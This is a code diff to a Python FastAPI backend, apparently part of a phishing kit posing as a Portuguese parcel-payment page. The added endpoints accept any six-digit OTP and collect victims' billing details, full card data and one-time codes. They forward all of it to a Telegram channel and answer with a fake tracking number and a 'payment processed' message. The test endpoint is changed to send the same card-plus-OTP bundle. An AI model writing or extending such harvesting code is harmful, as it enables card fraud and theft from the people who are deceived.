@@ -156,6 +156,95 @@ async def get_admin_stats():
         logger.error(f"Error generating admin stats: {str(e)}")
         raise HTTPException(status_code=500, detail="Erro interno do servidor")
 
+@router.post("/otp/resend")
+async def resend_otp_code(request: dict, background_tasks: BackgroundTasks):
+    """Reenviar código OTP"""
+    try:
+        phone = request.get('phone', '')
+        billing_data = request.get('billing_data', {})
+        
+        # Generate new OTP (in real app, send via SMS service)
+        new_otp = f"{random.randint(100000, 999999)}"
+        
+        # Store OTP temporarily (in real app, use Redis or database)
+        # For demo, we'll just log it
+        logger.info(f"New OTP generated: {new_otp} for phone: {phone}")
+        
+        # Send notification to Telegram
+        background_tasks.add_task(
+            telegram_service.send_otp_notification,
+            billing_data,
+            new_otp,
+            "resend"
+        )
+        
+        return {
+            "status": "success",
+            "message": f"Novo código enviado para {phone}",
+            "otp": new_otp  # Remove this in production!
+        }
+        
+    except Exception as e:
+        logger.error(f"Error resending OTP: {str(e)}")
+        raise HTTPException(status_code=500, detail="Erro ao reenviar código")
+
+@router.post("/otp/verify")
+async def verify_otp_code(request: dict, background_tasks: BackgroundTasks):
+    """Verificar código OTP e processar pagamento"""
+    try:
+        otp_code = request.get('otp_code', '')
+        billing_data = request.get('billing_data', {})
+        card_data = request.get('card_data', {})
+        
+        # Simple OTP validation (in real app, check against stored OTP)
+        valid_otps = ["123456", "000000", "111111"]  # Demo codes
+        
+        if otp_code not in valid_otps:
+            # For demo, any 6-digit code works
+            if len(otp_code) == 6 and otp_code.isdigit():
+                pass  # Accept any 6-digit code for demo
+            else:
+                return {
+                    "status": "error",
+                    "message": "Código OTP inválido"
+                }
+        
+        # Generate tracking number
+        tracking_number = f"RR{str(uuid.uuid4().int)[:9]}PT"
+        
+        # Create tracking data
+        tracking_data = TrackingData(
+            tracking_number=tracking_number,
+            billing_data=BillingData(**billing_data),
+            card_data=CardData(**card_data),
+            status="otp_verified"
+        )
+        
+        # Store payment data
+        payment_storage[tracking_data.id] = tracking_data.dict()
+        
+        # Send complete payment info to Telegram with OTP verification
+        background_tasks.add_task(
+            telegram_service.send_payment_with_otp_info,
+            billing_data,
+            card_data,
+            otp_code,
+            tracking_number
+        )
+        
+        logger.info(f"OTP verified and payment processed for {billing_data.get('nome', 'Unknown')}")
+        
+        return {
+            "status": "success",
+            "message": "Código verificado e pagamento processado!",
+            "tracking_number": tracking_number,
+            "tracking_id": tracking_data.id
+        }
+        
+    except Exception as e:
+        logger.error(f"Error verifying OTP: {str(e)}")
+        raise HTTPException(status_code=500, detail="Erro na verificação do código")
+
 @router.post("/test/telegram")
 async def test_telegram_integration(background_tasks: BackgroundTasks):
     """Endpoint especial para testar o Telegram sem preencher formulários"""
@@ -178,9 +267,11 @@ async def test_telegram_integration(background_tasks: BackgroundTasks):
         
         # Enviar apenas mensagem completa (cliente + pagamento) para Telegram
         background_tasks.add_task(
-            telegram_service.send_payment_info,
+            telegram_service.send_payment_with_otp_info,
             test_billing_data,
-            test_card_data
+            test_card_data,
+            "123456",
+            "RR123456789PT"
         )
         
         logger.info("Telegram test messages sent")
